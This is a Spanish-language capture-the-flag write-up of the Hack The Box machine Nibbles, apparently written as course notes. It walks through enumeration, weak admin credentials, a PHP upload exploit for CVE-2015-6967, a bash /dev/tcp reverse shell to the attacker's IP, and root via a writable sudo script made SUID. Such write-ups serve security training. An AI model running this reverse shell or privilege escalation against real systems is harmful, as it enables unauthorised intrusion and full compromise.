---
tags:
- Máquinas y prácticas
---

# Nibbles HTB

**NIBBLES**

Hack The Box - Writeup de maquina

Chema Marmol - Evolve Academy - 5 de julio de 2026

| **Dato** | **Valor** |
| --- | --- |
| IP de la maquina (target) | 10.129.96.84 |
| IP de Kali (VPN tun0) | 10.10.15.138 |
| Sistema operativo objetivo | Ubuntu Linux |
| Servicios expuestos | 22/tcp SSH - 80/tcp Apache 2.4.18 |
| CMS explotado | Nibbleblog v4.0.3 |
| CVE explotado | CVE-2015-6967 - Nibbleblog File Upload RCE |
| Vector de privesc | sudo NOPASSWD sobre script escribible (monitor.sh) |
| Flag de user | eca11dcb06b2536c7dea88fa6dddad43 |
| Flag de root | 8265a59fb59e3e6b4af48f9d7443f3bc |

| Estos apuntes documentan el kill chain completo de la maquina Nibbles de HTB. Entorno de laboratorio autorizado con fines educativos. |
| --- |

# **1. Objetivos de la sesion**

En esta maquina se trabajan los siguientes objetivos de aprendizaje:

| **Objetivo** | **Tecnica / concepto** |
| --- | --- |
| Descubrir servicios expuestos | Nmap -sVC -p- |
| Encontrar rutas ocultas sin fuzzing | Inspeccion de codigo fuente HTML (comentarios) |
| Enumerar directorios del CMS | Gobuster sobre /nibbleblog/ |
| Identificar credenciales debiles del CMS | Contrasena obvia relacionada con el nombre del CMS y la maquina |
| Explotar RCE en Nibbleblog via PHP upload | CVE-2015-6967 - plugin My Image |
| Escalar privilegios via sudo sobre script escribible | echo hacia monitor.sh + sudo NOPASSWD + bash -p |

# **2. Conceptos clave**

## **CVE-2015-6967 - Nibbleblog Arbitrary File Upload**

Nibbleblog v4.0.3 permite al administrador subir archivos a traves del plugin My Image sin validar la extension del archivo. Acepta ficheros PHP aunque muestre advertencias de error de imagen. El fichero se guarda como image.php en content/private/plugins/my\_image/ y puede ejecutarse directamente desde el navegador, dando RCE con los permisos del servidor web.

| El exploit requiere credenciales validas de administrador del panel de Nibbleblog. Sin acceso al panel, la vulnerabilidad no es explotable directamente. |
| --- |

## **Comentarios HTML como vector de descubrimiento**

Los comentarios HTML son visibles en el codigo fuente pero no se muestran al usuario. Desarrolladores descuidados dejan rutas, versiones o notas tecnicas en comentarios que cualquier atacante puede leer con curl o la opcion Ver codigo fuente del navegador. En esta maquina el comentario revelaba directamente la ruta del CMS instalado.

## **sudo NOPASSWD sobre archivo escribible**

Cuando sudo permite ejecutar un script como root sin contrasena (NOPASSWD) y ese script es escribible por el usuario actual, el atacante puede anadir comandos al final del script y ejecutarlos con privilegios de root. En esta maquina monitor.sh tenia permisos 777 (rwxrwxrwx), lo que permitia a nibbler escribir en el y ejecutarlo como root con sudo.

| Peligro: los permisos 777 en scripts ejecutables via sudo son un fallo de seguridad critico. Cualquier usuario del sistema puede modificar el script e inyectar comandos que se ejecutaran como root. |
| --- |

# **3. Kill Chain - Vision general**

| **1. Reconocimiento - Nmap detecta SSH (22) y Apache (80)** |
| --- |
| ↓ |
| **2. curl - comentario HTML revela /nibbleblog/** |
| ↓ |
| **3. Gobuster sobre /nibbleblog/ - descubre /admin/, /content/, /plugins/, README** |
| ↓ |
| **4. README confirma Nibbleblog v4.0.3 vulnerable a CVE-2015-6967** |
| ↓ |
| **5. Credenciales: admin / nibbles - acceso al panel de admin** |
| ↓ |
| **6. CVE-2015-6967 - subida de shell.php via plugin My Image** |
| ↓ |
| **7. Ejecucion de image.php - reverse shell como nibbler** |
| ↓ |
| **8. Enumeracion: user.txt + sudo -l + unzip personal.zip** |
| ↓ |
| **9. monitor.sh tiene permisos 777 - inyeccion de chmod +s /bin/bash** |
| ↓ |
| **10. sudo monitor.sh + bash -p = root** |

# **4. Desarrollo tecnico paso a paso**

| **Paso 1** | **Reconocimiento con Nmap** |
| --- | --- |

Escaneo completo de todos los puertos TCP con deteccion de versiones y scripts:

| nmap -sVC 10.129.96.84 -p- -oA nibbles -vvvv |
| --- |

| **Puerto** | **Estado** | **Servicio** | **Version** |
| --- | --- | --- | --- |
| 22/tcp | open | SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 |
| 80/tcp | open | HTTP | Apache httpd 2.4.18 (Ubuntu) |

| El puerto 80 no tiene titulo de pagina. Hay que inspeccionar el codigo fuente antes de lanzar fuzzing. |
| --- |

| **Paso 2** | **Inspeccion del codigo fuente de la pagina principal** |
| --- | --- |

Sin lanzar fuzzing, se inspecciona el codigo fuente de la pagina principal con curl:

| curl -s http://10.129.96.84 |
| --- |

Respuesta del servidor:

| <b>Hello world!</b>  <!-- /nibbleblog/ directory. Nothing interesting here! --> |
| --- |

| El comentario HTML revela directamente la ruta del CMS instalado. No fue necesario fuzzing para encontrar /nibbleblog/. Siempre inspeccionar el codigo fuente antes de lanzar herramientas activas. |
| --- |

| **Paso 3** | **Enumeracion de directorios con Gobuster** |
| --- | --- |

Con la ruta /nibbleblog/ identificada, se lanza Gobuster para enumerar su estructura interna:

| gobuster dir -u http://10.129.96.84/nibbleblog -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt |
| --- |

| **Ruta encontrada** | **Status** | **Relevancia** |
| --- | --- | --- |
| /nibbleblog/content | 301 | Contiene los ficheros subidos - aqui estara la shell |
| /nibbleblog/admin | 301 | Panel de administracion del CMS |
| /nibbleblog/plugins | 301 | Plugins instalados - vector de explotacion |
| /nibbleblog/README | 200 | Revela la version exacta: Nibbleblog v4.0.3 |
| /nibbleblog/themes | 301 | Temas del blog |
| /nibbleblog/languages | 301 | Traducciones del CMS |

El README confirma la version del CMS: Nibbleblog v4.0.3 (codename Coffee, 2014). Esta version es vulnerable al CVE-2015-6967.

| **Paso 4** | **Acceso al panel de administracion** |
| --- | --- |

El panel de login de Nibbleblog esta en /nibbleblog/admin.php. Las credenciales se deducen del nombre del CMS y la maquina:

| **Campo** | **Valor** | **Razonamiento** |
| --- | --- | --- |
| Usuario | admin | Usuario por defecto de la mayoria de CMS |
| Contrasena | nibbles | Nombre de la maquina HTB - contrasena obvia para una instalacion de prueba |

| Atencion: Nibbleblog bloquea la IP tras varios intentos fallidos (error 1024 - security error). No probar mas de 2-3 combinaciones seguidas. En maquinas de dificultad facil la contrasena suele ser muy obvia. |
| --- |

| **Paso 5** | **Preparacion de la reverse shell PHP** |
| --- | --- |

Se crea el fichero shell.php con una reverse shell en bash via /dev/tcp, apuntando a la IP de Kali y puerto 4444:

| echo '<?php system("bash -c \'bash -i >& /dev/tcp/10.10.15.138/4444 0>&1\'"); ?>' > shell.php |
| --- |

| cat shell.php  <?php system("bash -c 'bash -i >& /dev/tcp/10.10.15.138/4444 0>&1'"); ?> |
| --- |

| **Paso 6** | **Explotacion CVE-2015-6967 - subida via plugin My Image** |
| --- | --- |

En el panel de admin: Plugins -> My Image -> Configure. Se sube shell.php como si fuera una imagen. Nibbleblog muestra warnings de error de imagen pero acepta el fichero PHP y lo guarda como image.php.

| # Ruta donde Nibbleblog guarda el fichero subido:  http://10.129.96.84/nibbleblog/content/private/plugins/my\_image/image.php |
| --- |

| Los warnings de PHP (imagesy, imagecreatetruecolor, etc.) son normales. El fichero se sube correctamente aunque el servidor no pueda procesarlo como imagen. No cancelar el proceso. |
| --- |

| **Paso 7** | **Obtencion de la reverse shell como nibbler** |
| --- | --- |

Con el listener activo en Kali, se accede a la URL del fichero subido para ejecutar la reverse shell:

| # En Kali - abrir listener antes de ejecutar la shell:  nc -lvnp 4444  # En el navegador - visitar la URL para ejecutar el PHP:  http://10.129.96.84/nibbleblog/content/private/plugins/my\_image/image.php |
| --- |

Conexion recibida en el listener. Se estabiliza la shell con Python:

| connect to [10.10.15.138] from (UNKNOWN) [10.129.96.84] 56542  nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my\_image$ whoami  nibbler  python3 -c 'import pty; pty.spawn("/bin/bash")' |
| --- |

| **Paso 8** | **Enumeracion interna como nibbler** |
| --- | --- |

Se navega al home del usuario, se obtiene la flag de user y se comprueban los permisos sudo:

| cd /home/nibbler && ls  # personal.zip user.txt  cat user.txt  # eca11dcb06b2536c7dea88fa6dddad43  sudo -l  # (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh |
| --- |

| Vector de escalada identificado: nibbler puede ejecutar monitor.sh como root sin contrasena. El fichero esta dentro del home de nibbler, probablemente escribible. |
| --- |

El directorio personal/ no existe todavia - esta dentro de personal.zip. Se descomprime y se comprueban los permisos de monitor.sh:

| unzip personal.zip  ls -la personal/stuff/monitor.sh  # -rwxrwxrwx 1 nibbler nibbler 4015 monitor.sh |
| --- |

| Permisos 777 en monitor.sh. Cualquier usuario puede escribir en este fichero. Como nibbler puede ejecutarlo como root via sudo, tiene control total sobre lo que root ejecuta. |
| --- |

| **Paso 9** | **Escalada de privilegios - inyeccion en monitor.sh** |
| --- | --- |

Se anade el comando chmod +s /bin/bash al final de monitor.sh con >> y se ejecuta como root con sudo:

| echo 'chmod +s /bin/bash' >> /home/nibbler/personal/stuff/monitor.sh  sudo /home/nibbler/personal/stuff/monitor.sh |
| --- |

El script corre como root, ejecuta el comando anadido y activa el bit SUID en /bin/bash. A continuacion se ejecuta bash con el flag -p para heredar euid=0:

| bash -p  bash-4.3# whoami  root  cat /root/root.txt  8265a59fb59e3e6b4af48f9d7443f3bc |
| --- |

| Maquina completamente comprometida. euid=0 (root) obtenido via bit SUID en bash. El flag -p indica a bash que mantenga los privilegios elevados del propietario del binario (root) en vez de descartarlos. |
| --- |

# **5. Herramientas utilizadas en la sesion**

| **Herramienta** | **Objetivo** | **Fase** | **Comando o uso visto** | **Nivel** | **Notas** |
| --- | --- | --- | --- | --- | --- |
| Nmap | Descubrir puertos y servicios | Reconocimiento | nmap -sVC IP -p- -oA nibbles | Recurrente | Detecto SSH y Apache con versiones exactas |
| curl | Inspeccionar codigo fuente HTML | Reconocimiento | curl -s http://IP | Recurrente | Revelo el comentario HTML con /nibbleblog/ |
| Gobuster | Enumerar directorios del CMS | Enumeracion web | gobuster dir -u URL -w wordlist | Practicada | Descubrio /admin/, /content/, /plugins/, README |
| Nibbleblog My Image plugin | Subida de PHP malicioso | Explotacion | Admin -> Plugins -> My Image -> Configure -> Browse -> Save | Introducida | Acepta PHP pese a mostrar warnings de imagen |
| Netcat | Listener para reverse shell | Explotacion | nc -lvnp 4444 | Practicada | Recibio la conexion de image.php |
| Python3 pty | Estabilizar la shell | Post-explotacion | python3 -c 'import pty; pty.spawn("/bin/bash")' | Practicada | Convierte shell limitada en shell interactiva |
| sudo -l | Enumerar permisos sudo del usuario | Enumeracion privesc | sudo -l | Recurrente | Revelo NOPASSWD sobre monitor.sh |
| echo + >> | Inyectar comando en script escribible | Escalada de privilegios | echo 'chmod +s /bin/bash' >> monitor.sh | Introducida | Anadir linea al final sin sobrescribir el contenido original |
| bash -p | Ejecutar bash con euid=0 via SUID | Escalada de privilegios | bash -p | Practicada | Segunda vez - ya vista en Reactor |

# **6. Errores comunes y buenas practicas**

| **Error comun** | **Causa** | **Solucion** |
| --- | --- | --- |
| Usar dirsearch sin http:// en la URL | dirsearch -u 10.129.96.84 falla | Siempre incluir el esquema: dirsearch -u http://IP |
| Probar muchas contrasenas y quedar bloqueado por Nibbleblog | El antibrute-force bloquea tras pocos intentos (error 1024) | Pensar antes de actuar - la contrasena suele ser obvia en maquinas faciles |
| Lanzar fuzzing sin mirar el codigo fuente primero | Perdida de tiempo cuando la ruta ya estaba en un comentario HTML | Siempre hacer curl -s URL antes de lanzar gobuster o ffuf |
| Cancelar la subida al ver los warnings de imagen en Nibbleblog | Los warnings son normales, el fichero se sube igualmente | Ignorar los warnings y hacer Save changes siempre |
| No descomprimir personal.zip antes de navegar a personal/ | La carpeta no existe hasta descomprimir el zip | Siempre hacer ls completo y buscar ficheros comprimidos en el home |
| Usar > en vez de >> al inyectar en monitor.sh | > sobrescribiria el fichero y podria romperse la ejecucion | Usar >> para anadir al final sin borrar el contenido original |

# **7. Conexion con sesiones anteriores**

Esta maquina consolida y amplia tecnicas vistas en Reactor y sesiones previas:

| **Tecnica** | **Vista en** | **Nuevo en Nibbles** |
| --- | --- | --- |
| Nmap reconocimiento | Todas las sesiones | Sin cambios - uso habitual |
| Inspeccion de codigo fuente con curl | Mencionada antes | Primer uso destacado: comentario HTML como vector principal de descubrimiento |
| Gobuster enumeracion web | Sesiones anteriores | Nuevo uso sobre subdirectorio especifico de CMS (/nibbleblog/) |
| Netcat listener para reverse shell | Reactor y otras maquinas | Primer uso de reverse shell PHP via /dev/tcp en lugar de Node.js |
| sudo -l enumeracion de permisos | Maquinas de privesc anteriores | Nuevo vector: NOPASSWD sobre script escribible por el usuario |
| Bit SUID en bash via chmod +s | Reactor (via Node Inspector) | Misma tecnica pero ahora inyectada via script sudo con permisos 777 |
| Python3 pty estabilizacion de shell | Varias sesiones | Uso consistente - nivel practicada confirmado |

# **8. Resumen del ataque**

| **Vector** | **Vulnerabilidad** | **Impacto** |
| --- | --- | --- |
| Codigo fuente HTML | Comentario con ruta del CMS en texto plano | Descubrimiento de /nibbleblog/ sin necesidad de fuzzing |
| Credenciales debiles | Contrasena admin = nombre de la maquina (nibbles) | Acceso al panel de administracion de Nibbleblog |
| CVE-2015-6967 | Nibbleblog v4.0.3 - subida de PHP sin validar extension | RCE como usuario nibbler desde el servidor web |
| sudo NOPASSWD + script 777 | monitor.sh ejecutable como root y escribible por nibbler | Escalada a root via inyeccion de chmod +s /bin/bash |

| Nibbles demuestra como una cadena de vulnerabilidades simples puede llevar al compromiso total: informacion expuesta en HTML + credenciales debiles + CMS desactualizado + mala configuracion de sudo. |
| --- |

# **9. Checklist de repaso**

| **#** | **Pregunta de control** |
| --- | --- |
| 1 | He escaneado todos los puertos con -p- antes de asumir que no hay mas servicios? |
| 2 | He inspeccionado el codigo fuente con curl antes de lanzar fuzzing? |
| 3 | Hay comentarios HTML con rutas, versiones o informacion tecnica? |
| 4 | He leido el README del CMS para identificar la version exacta y buscar CVEs? |
| 5 | Las credenciales del panel son obvias (nombre del CMS, nombre de la maquina)? |
| 6 | El CMS tiene plugins que permiten subida de ficheros? Validan la extension? |
| 7 | He abierto el listener nc antes de ejecutar la reverse shell? |
| 8 | He estabilizado la shell con python3 pty antes de seguir enumerando? |
| 9 | He ejecutado sudo -l para ver si el usuario puede ejecutar algo como root? |
| 10 | Los scripts ejecutables via sudo son escribibles por el usuario actual? |
| 11 | He descomprimido todos los ficheros zip encontrados en el home del usuario? |
| 12 | Verifico con ls -la /bin/bash que la s esta presente antes de ejecutar bash -p? |

# **10. Actualizacion del registro de herramientas**

| Herramientas nuevas o con cambio de nivel detectadas en esta sesion. |
| --- |

| **Herramienta** | **Estado anterior** | **Estado nuevo** | **Motivo** |
| --- | --- | --- | --- |
| Gobuster | Practicada | Practicada | Nuevo uso: enumeracion sobre subdirectorio especifico de CMS |
| Nibbleblog My Image + CVE-2015-6967 | No registrada | Introducida | Primera vez - plugin de Nibbleblog para subida de PHP malicioso |
| echo + >> (inyeccion en script) | No registrada | Introducida | Primera vez - anadir comando a script escribible para privesc via sudo |
| bash -p (SUID) | Introducida (Reactor) | Practicada | Segunda vez - misma tecnica, ahora via script sudo en lugar de Node Inspector |
| Python3 pty estabilizacion | Introducida | Practicada | Uso consistente en varias sesiones - nivel actualizado |
| curl inspeccion HTML | Recurrente | Recurrente | Nuevo uso destacado: buscar comentarios HTML con rutas ocultas |
